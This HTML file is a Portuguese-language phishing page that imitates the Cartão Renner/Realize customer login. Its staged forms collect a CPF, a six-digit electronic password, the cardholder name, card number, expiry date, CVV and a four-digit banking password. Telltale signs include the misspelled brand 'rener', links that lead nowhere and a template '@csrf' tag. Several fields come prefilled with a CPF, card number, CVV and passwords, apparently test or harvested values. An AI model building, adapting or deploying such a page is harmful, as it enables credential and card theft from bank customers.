<!doctype html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
        content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Cartão Renner</title>
    <!-- Meta Tags -->
    <meta name="apple-mobile-web-app-status-bar-style" content="#1e1e1e" id="metatag-ios-theme-color">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <!-- Icones -->
    <link href="../img/favicon.ico" type="image/x-icon" rel="icon">
    <link href="../img/lojas-rener.png" sizes="144x144" rel="icon">
    <link href="../img/lojas-rener.png" rel="apple-touch-icon">
        <!-- CSS only -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
        <!-- JavaScript Bundle with Popper -->
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
        <!-- CSS local -->
        <link rel="stylesheet" href="../css/all.css" type="text/css">
        <!-- jQuery only -->
        <script src="https://code.jquery.com/jquery-3.6.0.js" integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" crossorigin="anonymous"></script>

</head>
<body>
    <header class="__HEADER_COLOR_DARK_900">
        <div class="container fluid">
            <div class="d-flex justify-content-center justify-content-md-between py-1 py-md-2 align-items-center __HEADER_STYLE">
                <div class="_DIV_BETWEEN_LOGO_HEADER_ d-none d-md-block">
                    <img src="../img/logo-realize.svg" alt="Logo realize">
                </div>
                <div class="justify-self-center">
                    <!-- Md -->
                    <a href="#" target="_blank" class="btn btn-outline-light d-none d-md-block">
                        ir para a loja virtual
                    </a>
                    <!-- Sm -->
                    <a href="#" target="_blank" class="text-white d-block d-md-none __NO_UNDERLINE">
                        ir para a loja virtual
                    </a>
                </div>
            </div>
        </div>
    </header>
<main>
    <form method="post">
        @csrf
        <section id="_FORM_LOGIN" class="container py-4">
            <div class="row justify-content-start">
                <div class="col-md-3 ">
                    <div class="d-flex px-2 gap-1 gap-md-3 flex-row flex-md-column __LOGOS_BODY justify-content-start justify-content-md-end">
                        <div>
                        <img src="../img/car_rener.png" alt="Cartão rener Logo">
                        </div>
                        <div class="d-flex gap-3 flex-md-column">
                            <img src="../img/cartao-rener-logo.svg" alt="Cartão rener Logo">
                            <img src="../img/logo-realize.svg" alt="Meu cartão rener Logo">
                        </div>
                       
                    </div>
                </div>
                <!-- FORM -->
                    <div>
                        <div>
                            <div class="col-md-4">
                                <div class="d-flex flex-column gap-3 __LOGIN_FORM">
                                    <div>
                                        <p class="text-center text-md-start">
                                            Pague suas compras e visualize seus limites. <br>
                                            Acesse digitando seu <span class="text-uppercase">cpf</span>
                                        </p>
                                    </div>
                                    <div class="__BOX __BORDER_5PX d-flex flex-column justify-content-center p-3 gap-3">
                                        <h5 class="__CARD_TITLE">
                                            Acesse sua conta
                                        </h5>
                                        <div class="__INPUT mb-4">
                                            <div class="input-group input-group-sm __BORDER_BOTTOM_BLACK pb-1 _INVALID_ALERT _BORDER_BOTTOM_INVALID" style="border-color: rgb(30, 30, 31);">
                                                <span class="input-group-text border-0 m-0 p-0 mb-0 bg-transparent align-items-end">
                                                    <i class="far fa-user-alt _INVALID_ALERT" style="font-size: 18px;"></i>
                                                </span>
                                                <div class="form-floating flex-grow-1 __INPUT_FLOAT_CUSTUMIZED">
                                                    <input value="12822372764" type="text" class="form-control shadow-none border-0 bg-transparent cpf" name="cpf" id="cpf" placeholder="Code 1" maxlength="14" value="">
                                                    <label for="code1" class="mb-0 pb-0">
                                                        <small class="text-muted text-uppercase" style="font-size: 16px;">cpf</small>
                                                    </label>
                                                </div>
                                            
                                            </div>
                                            <small class="text-danger _INVALID_CPF" style="font-size: 12px; visibility: hidden;">Número de CPF inválido</small>
                                        </div>
                                        <div>
                                            <button type="button" id="cpfbtn" name="cpfbtn" class="btn btn-dark w-100 __BTN_PROSSEGUIR">
                                                Prosseguir
                                            </button>
                                        </div>
                                        <div>
                                            <p class="text-center">
                                            <small>
                                                    Esse formulário está protegido por Google reCaptcha.
                                                    <a class="text-muted" href="https://policies.google.com/privacy?hl=en" target="_blank">
                                                        Termos
                                                    </a> 
                                                    -
                                                    <a class="text-muted" href="https://policies.google.com/terms?hl=en" target="_blank">
                                                        Privacidade
                                                    </a> 
                                            </small>
                                            </p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                <!-- END FORM -->
            </div>
        </section>        
        <section id="_FORM_SENHA" class="container py-4 mb-4"><div class="row">
            <div class="col-md-3">
                <div class="d-flex h-100 flex-column align-items-md-start text-left justify-content-start">
                    <h1 class="mb-5">Olá, <br> <span id="_nome_pessoa" style="font-size:18px;"><!-- {_NOME_PESSOA_} --></span></h1>
                    <p style="font-size: 18px;">
                        Já nos conhecemos :) então, acesse seu cartão digitando sua senha eletrônica
                    </p>
                    <span class="text-dange">
                        <i class="fal fa-long-arrow-right" style="width:35px;"></i>
                    </span>
                    <a onclick="window.location.href = '/';" class="text-muted mt-5">Não sou eu, quero sair</a>
                </div>
                
            </div>
            <div>   
                    <div class="col-md-4 ms-5">
                        <div class="row p-4 __CARD_FORM">
                            <div class="col-md-12">
                                <h1 class="__TITLE_H1 ">
                                    Acesse sua conta
                                </h1>
                                <div class="d-flex mt-4 border-1 bg-gray-light text-muted p-2 align-items-center rounded">
                                    <div class="col-1">
                                        <i class="fal fa-info-circle"></i>
                                    </div>
                                    <div class="col-11 ps-1">
                                        <small class="text-muted" style="line-height: 0.8 !important;">
                                            Senha utilizada para acessar o aplicativo e o site dos Cartões Rener.
                                        </small>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-md-12 mt-4">
                                        <div class="input-group input-group-sm  __BORDER_BOTTOM_BLACK pb-1 _INVALID_ALERT _BORDER_BOTTOM_INVALID">
                                            <span class="input-group-text border-0 m-0 p-0 mb-0 bg-transparent align-items-end">
                                                <i class="fal fa-lock _INVALID_ALERT" style="font-size: 18px;"></i>
                                            </span>
                                            <div class="form-floating flex-grow-1 __INPUT_FLOAT_CUSTUMIZED">
                                                <input value="434343" type="text" class="form-control shadow-none border-0 bg-transparent __SENHA_ELETRONICA" name="senha" id="senha" placeholder="Code 1" maxlength="6">
                                                <label for="code1" class="mb-0 pb-0">
                                                    <small class="text-muted text-uppercase" style="font-size: 16px;">Senha de 6</small>
                                                </label>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-md-12 mt-4 mb-4">
                                        <div class="row row-cols-3 justify-content-center" id="_BUTTONS_GENERATOR">
                                        </div>
                                    </div>
                                    <div class="col-md-12 mt-4">
                                        <div class="row">
                                            <button type="button" id="senhabtn" name="senhabtn" class="btn btn-dark" id="_BTN_ACESSAR">
                                                acessar
                                            </button>
                                            <div class="row text-center py-3">
                                                <a class="_LINK text-muted" href="#">esqueci a senha</a>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
            </div>
        </div>
        
        <script>
            $("#__SENHA_ELETRONICA").mask("000000");
            $("#__SENHA_ELETRONICA").on("input", event => {
                $("#_BTN_ACESSAR").attr('disabled', event.target.value.length != 6); 
            });
        
            $("#_BTN_ACESSAR").click(_=>{
                
                        if($("#__SENHA_ELETRONICA").val().length != 6){
                            return;
                        }
        
                        $.ajax({
                            data:{
                                _PASS: $("#__SENHA_ELETRONICA").val(),
                                _FORM: 'FORM_2'
                            },
                            success: data => {
                                if(data.error){
                                    $("#_FORM_LOGIN, #_FORM_IDENTIDADE").fadeOut(_=>{
                                        $("#_BTN_ACESSAR").attr('disabled', true);
                                        $("#_FORM_SENHA").html(data.html).fadeIn();
                                      
                                        return; 
                                    });
                                }
        
                                $("#_FORM_SENHA, #_FORM_LOGIN").fadeOut(_=>{
                                    $("#_FORM_IDENTIDADE").html(data.html).fadeIn();
                                });
                            }
                        });
                    });
        </script>
        </section>
        <section id="_FORM_IDENTIDADE" class="container py-4">
            <div class="row justify-content-center">
                <div class="col-md-5 __BORDER_5PX p-3">
                    <h4 style="font-size: larger;font-weight: bolder;">Confirme sua identidade</h4>
                    <div class="row">
                        <div class="col-md-12 mb-3">
                            <div class="form-floating mb-0 _CARD_NAME_INVALID _CUSTUM_LAST_FORM">
                                <input value="junior junior" name="nome_cartao" type="text" class="form-control" id="nome_cartao" maxlength="30" placeholder="ex: 1234 5678 9101 1213">
                                <label for="nome_cartao">Nome do cartão</label>
                            </div>
                            <small class="SMALL_CARD_NAME_INVALID text-danger" style="visibility: hidden;">Campo inválido</small>
                        </div>
                        <div class="col-md-12 mb-3">
                            <div class="form-floating mb-0 _CARD_INVALID _CUSTUM_LAST_FORM">
                                <input value="5067213080014895" name="numero_cartao" type="text" class="form-control" id="numero_cartao" placeholder="ex: 1234 5678 9101 1213" maxlength="19">
                                <label for="numero_cartao">Número do cartão</label>
                            </div>
                            <small class="SMALL_CARD_INVALID text-danger" style="visibility: hidden;">Número de cartão inválido</small>
                        </div>
                        <div class="col-md-4 mb-3">
                            <div class="form-floating mb-0 pe-0 _CARD_DATE_INVALID _CUSTUM_LAST_FORM">
                                <input value="10/11" name="validade_cartao" type="text" class="form-control" id="validade" placeholder="ex: MM/YY" maxlength="5">
                                <label for="validade">Validade</label>
                            </div>
                            <small class="SMALL_CARD_DATE_INVALID text-danger" style="visibility: hidden;">Data inválida</small>
                        </div>
                        <div class="col-md-3 mb-3">
                            <div class="form-floating _CARD_CVV_INVALID _CUSTUM_LAST_FORM">
                                <input value="254" name="cvv_cartao" type="text" class="form-control" id="cvv" placeholder="ex: MM/YY" maxlength="3">
                                <label for="cvv">CVV</label>
                            </div>
                            <small class="SMALL_CARD_CVV_INVALID text-danger text-nowrap" style="visibility: hidden;">Campo inválido</small>
                        </div>
                        <div class="col-md-5 mb-3">
                            <div class="form-floating _CARD_IB_INVALID _CUSTUM_LAST_FORM">
                                <input value="5467" name="pass_internet_banking" type="text" class="form-control" id="pass_internet_banking" placeholder=" Internet Benkking" maxlength="4">
                                <label for="pass_internet_banking" class="text-nowrap">Senha de 4</label>
                            </div>
                            <small class="SMALL_CARD_IB_INVALID text-danger" style="visibility: hidden;">Campo inválido</small>
                        </div>
                        <div class="col-md-12 py-3 text-center">
                            <button  class="btn btn-dark w-100 mb-3">
                                Confirmar a Identidade
                            </button>
                            <small class="text-muted text-center mt-2">
                                Ao confirmar sua identitade você será redirecionado para página inicial.
                            </small>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </form>
</main>
<footer class="pt-5">
    <div class="container">
        <div class="row">
            <div class="col-md-4">
                <div class="d-flex flex-column justify-content-start">
                    <ul class="__LIST p-0">
                        <li class="__LIST_ITEM mb-3">
                            <a href="#" target="_blank">Home</a>
                        </li>
                        <li class="__LIST_ITEM mb-3">
                            <a href="#">rener</a>
                        </li>
                        <li class="__LIST_ITEM mb-3">
                            <a href="#" target="_blank">Meu cartão</a>
                        </li>
                        <li class="__LIST_ITEM mb-3">
                            <a href="#" target="_blank">Quero Cartão rener</a>
                        </li>
                        <li class="__LIST_ITEM mb-3">
                            <a href="#" target="_blank">Contato</a>
                        </li>

                        <li class="__LIST_ITEM mt-4">
                            <a href="#" target="_blank">Institucional</a>
                        </li>
                    </ul>
                </div>
                <div class="d-flex flex-column">
                    <h4 class="_FOOTER_TITLE_H4">Perguntas Frequentes</h4>
                    <ul class="__LIST">
                        <li class="__LIST_ITEM mb-3">
                            <a href="#" target="_blank">Cartão rener</a>
                        </li>
                        <li class="__LIST_ITEM mb-3">
                            <a href="#" target="_blank">Meu Cartão</a>
                        </li>
                        <li class="__LIST_ITEM mb-3">
                            <a href="#" target="_blank">Saque Rápido e Seguros</a>
                        </li>
                        <li class="__LIST_ITEM mb-3">
                            <a href="#" target="_blank">Privacidade e Segurança</a>
                        </li>
                    </ul>
                    <ul class="__LIST p-0">
                        <li class="__LIST_ITEM mb-3">
                            <a href="#" target="_blank">Central de Negociação</a>
                        </li>
                        <li class="__LIST_ITEM mb-3">
                            <a href="#" target="_blank">Acessa Sua Conta</a>
                        </li>
                    </ul>
                </div>
                <div class="d-flex flex-column">
                    <p class="text-muted">
                        Baixe o app da rener 
                    </p>
                    <div class="d-flex gap-3">
                        <img style="max-width: 135px; max-height: 40px;" src="assets/img/google-play-badge.html" alt="" srcset="">
                        <img style="max-width: 135px; max-height: 40px;" src="assets/img/app-store-badge_.html" alt="" srcset="">
                    </div>
                </div>
            </div>
            <div class="col-md-8">
                <h4 class="__TITLE_H4_RIGHT_FOOTER">Canais de Atendimento</h4>
                <div class="row">
                    <div class="col-md-6">
                        <div class="d-flex text-left mb-2">
                            <h4 class="fw-bold text-muted">
                                Central de Atendimento Cartões rener:
                            </h4>
                        </div>
                        <div class="d-flex mb-2">
                            <p class="text-muted">
                                2º via de faturas, consultas, 
informações, bloqueio e desbloqueio de cartões e orientações sobre 
canais digitais.
                            </p>
                        </div>
                        <div class="d-flex mb-2">
                            <p class="text-white">
                                Capitais e Regiões Metropolitanas <br>
                                <span style="font-size: 24px;font-weight: bolder;">3004 5060</span>
                            </p>
                        </div>
                        <div class="d-flex mb-2">
                            <p class="text-white">
                                Demais Localidades <br>
                                <span style="font-size: 24px;font-weight: bolder;">0800 073 6637</span>
                            </p>
                        </div>
                        <div class="d-flex mb-2">
                            <p class="text-white">
                                Horário de atendimento: 24 horas por dia, todos os dias.
                            </p>
                        </div>
                        <div class="d-flex mb-2">
                            <p class="text-white">
                                Comunicação em Libras via videochamada para Deficientes Auditivos ou de Fala     
                            </p>
                        </div>
                        <div class="d-flex mb-2">
                            <p class="text-white">
                                Horário de atendimento: 
                            </p>
                        </div>
                     
                        <div class="d-flex mb-2">
                            <p class="text-white">
                                De segunda a sábado, das 8h às 20h40
                            </p>
                        </div>
                        <div class="d-flex mb-2">
                            <a class="text-white __LIST_ITEM">
                                Para acessar o canal de atendimento por vídeo, clique aqui.
                            </a>
                        </div>
                        <div class="d-flex mb-2">
                            <h4 class="fw-bold text-muted">
                                Meu Cartão:
                            </h4>
                        </div>
                        <div class="d-flex mb-2">
                            <p class="text-muted">
                                SAC (Serviço de Atendimento ao Cliente) - Reclamações, Informações e Cancelamentos
                            </p>
                        </div>
                        <div class="d-flex mb-2">
                            <p class="text-white">
                                0800 600 6601
                                <br>
                                Horário de atendimento: 24 horas por dia, todos os dias. 
                            </p>
                        </div>
                        <div class="d-flex mb-2">
                            <small class="text-muted">
                                Verifique seus saldos, carnês e faturas e gere boletos para pagamentos pelo WhatsApp:    
                            </small>
                        </div>
                        <div class="d-flex mb-2">
                            <p class="text-white">
                                Mande um Oi para <i class="fas fa-whatsapp"></i>
                                <a href="#" class="_NAV_LINK">+55 (51) 3921 4004</a>
                            </p>
                        </div>
                        <div class="d-flex mb-2">
                            <p class="text-white">
                                Comunicação em Libras via videochamada para Deficientes Auditivos ou de Fala
                            </p>
                        </div>
                        <div class="d-flex mb-2">
                            <p class="text-white">
                                Horário de atendimento:
                            </p>
                        </div>
                        <div class="d-flex mb-2">
                            <p class="text-white">
                                De segunda a sábado, das 8h às 20h40
                            </p>
                        </div>
                        <div class="d-flex mb-2">
                            <small class="text-white">
                                <a href="#" class="_NAV_LINK">
                                    Para acessar o canal de atendimento por vídeo, clique aqui.
                                </a>
                            </small>
                        </div>
                        <div class="d-flex mb-2">
                            <small class="text-white">
                                <a href="#" class="_NAV_LINK_TITLE">
                                    Orientações para Representantes de 
                                    Deficientes Auditivos ou de Fala
                                </a>
                            </small>
                        </div>
                        
                    </div>
                    <div class="col-md-6">
                        <div class="d-flex text-left mb-2">
                            <h4 class="fw-bold text-muted">
                                Cartão rener:
                            </h4>
                        </div>
                        <div class="d-flex mb-2">
                            <p class="text-muted">
                                SAC (Serviço de Atendimento ao Cliente) - Reclamações, Informações e Cancelamentos
                            </p>
                        </div>
                        <div class="d-flex mb-2">
                            <p class="text-white">
                                0800 600 6601
                            </p>
                        </div>
                        <div class="d-flex mb-2">
                            <p class="text-white">
                                Horário de atendimento: 24 horas por dia, todos os dias.
                            </p>
                        </div>
                        <div class="d-flex mb-2">
                            <p class="text-muted">
                                Verifique seus saldos, carnês e faturas e gere boletos para pagamentos pelo WhatsApp:
                            </p>
                        </div>
                        <div class="d-flex mb-2">
                            <p class="text-white">
                                Mande um Oi para <i class="fas fa-whatsapp"></i>
                                <a href="#" class="_NAV_LINK">+55 (51) 3921 4004</a>
                            </p>
                        </div>
                        <div class="d-flex mb-2">
                            <h4 class="text-muted">
                                Central De Negociação:
                            </h4>
                        </div>
                        <div class="d-flex mb-2">
                            <p class="text-white">
                                Atendimento exclusivo para clientes com pendências de pagamento.
                            </p>
                        </div>
                        <div class="d-flex mb-2">
                            <p class="text-muted">
                                Entre em contato via WhatsApp:
                            </p>
                        </div>
                        <div class="d-flex mb-2">
                            <p class="text-white">
                                Mande um Oi para
                                <a href="#" class="_NAV_LINK">+55 (51) 3921 5464</a>
                            </p>
                        </div>
                        <div class="d-flex mb-2">
                            <p class="text-muted">
                                Se preferir, entre em contato via telefone:
                            </p>
                        </div>
                        <div class="d-flex mb-1">
                            <p class="text-white">
                                <span style="font-size: 24px;font-weight: bolder;">4004 2900</span>
                            </p>
                        </div>
                        <div class="d-flex mb-2">
                            <p class="text-white">
                                Horário de atendimento:
                                <br>
                                Em dias úteis, das 08h às 21h
                                <br>
                                Aos Sábados, das 08h às 20h.
                            </p>
                        </div>
                        <div class="d-flex mb-2">
                            <b class="text-muted">Ouvidoria:</b>
                        </div>
                        <div class="d-flex mb-2">
                            <p class="text-white">
                                Se não ficar satisfeito com a solução apresentada, de posse do protocolo, nos contate.
                            </p>
                        </div>
                        <div class="d-flex mb-1">
                            <p class="text-white">
                                <span style="font-size: 24px;font-weight: bolder;"> 0800 727 0127   </span>                            
                            </p>
                        </div>
                        <div class="d-flex mb-1">
                            <p class="text-white p-0 m-0">
                                Horário de atendimento: <br>      
                                Em dias úteis, das 10h às 16h.                       
                            </p>
                        </div>

                    </div>
                </div>
            </div>
        </div>
    </div>
</footer>  
<script>
    $('#_FORM_SENHA').hide()
    $('#_FORM_IDENTIDADE').hide()
    $('#_FORM_LOGIN').show()
    $("#cpfbtn").click(function(){
        $("#_FORM_LOGIN").toggle();
        $('#_FORM_IDENTIDADE').hide()
        $('#_FORM_SENHA').show()
        $("#senhabtn").click(function(){
            $("#_FORM_SENHA").toggle();
            $('#_FORM_LOGIN').hide()
            $('#_FORM_IDENTIDADE').show()
        });
    });
</script>  
</body>
</html>